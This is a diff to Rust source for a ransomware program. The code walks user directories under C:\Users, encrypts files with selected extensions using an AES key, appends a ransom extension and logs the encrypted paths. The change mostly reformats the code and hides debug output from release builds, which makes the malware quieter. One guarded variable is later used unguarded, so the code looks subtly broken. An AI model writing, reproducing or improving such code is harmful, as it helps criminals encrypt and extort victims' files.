@@ -44,12 +44,10 @@ pub fn get_user_name() -> Result<String, std::io::Error> {
     }
 
     // Convert i8 buffer to a UTF-8 string.
-    Ok(String::from_utf8_lossy(
-        &buffer.iter().map(|&c| c as u8).collect::<Vec<u8>>()
-    ).to_string())
+    Ok(String::from_utf8_lossy(&buffer.iter().map(|&c| c as u8).collect::<Vec<u8>>()).to_string())
 }
 
-/// Traverses the specified directories, encrypts matching files, and returns a FileTree 
+/// Traverses the specified directories, encrypts matching files, and returns a FileTree
 /// containing the paths of encrypted files.
 ///
 /// # Arguments
@@ -70,9 +68,8 @@ pub fn walk_and_encrypt_directories(
     for dir in dir_names.iter() {
         let full_path = format!("C:\\Users\\{}\\{}", user_name, dir);
         #[cfg(debug_assertions)]
-        {
-            println!("Exploring: {}", full_path);
-        }
+        println!("Exploring: {}", full_path);
+
         encrypt_directory_contents(
             &full_path,
             ransom_ext,
@@ -105,7 +102,7 @@ fn encrypt_directory_contents(
     let _ = traverse_and_encrypt(full_path, ransom_ext, valid_extensions, aes_key, file_tree);
 }
 
-/// Recursively traverses the directory and encrypts files with allowed extensions. 
+/// Recursively traverses the directory and encrypts files with allowed extensions.
 /// If encryption succeeds, the destination file path is added to the file tree.
 ///
 /// # Arguments
@@ -167,7 +164,9 @@ fn traverse_and_encrypt(
                 // Skip encrypting the running executable.
                 if file_path.exists() {
                     let current_exe_path = env::current_exe().expect("Unable to get the exe path");
-                    if current_exe_path.canonicalize().unwrap() == file_path.canonicalize().unwrap() {
+                    if current_exe_path.canonicalize().unwrap() == file_path.canonicalize().unwrap()
+                    {
+                        #[cfg(debug_assertions)]
                         println!("Skipping the current executable");
                     }
                 }
@@ -176,6 +175,7 @@ fn traverse_and_encrypt(
                 let dot_position = match new_dir.iter().rposition(|&x| x == b'.') {
                     Some(pos) => pos,
                     None => {
+                        #[cfg(debug_assertions)]
                         eprintln!("Error: No '.' found in the file name");
                         return Ok(());
                     }
@@ -196,12 +196,16 @@ fn traverse_and_encrypt(
                         CString::new(&dest_file_name[..]).unwrap(),
                         aes_key.to_vec(),
                     );
+
+                    #[cfg(debug_assertions)]
                     let source_file_str = String::from_utf8(source_file_name)
                         .unwrap_or_else(|_| "Invalid UTF-8".to_string());
                     let dest_file_str = String::from_utf8(dest_file_name)
                         .unwrap_or_else(|_| "Invalid UTF-8".to_string());
+                    
+                    #[cfg(debug_assertions)]
                     println!("{} -> {}", source_file_str, dest_file_str);
-
+                    
                     if encrypt_result {
                         // Add the path of the encrypted file to the file tree.
                         file_tree.push(dest_file_str.clone());
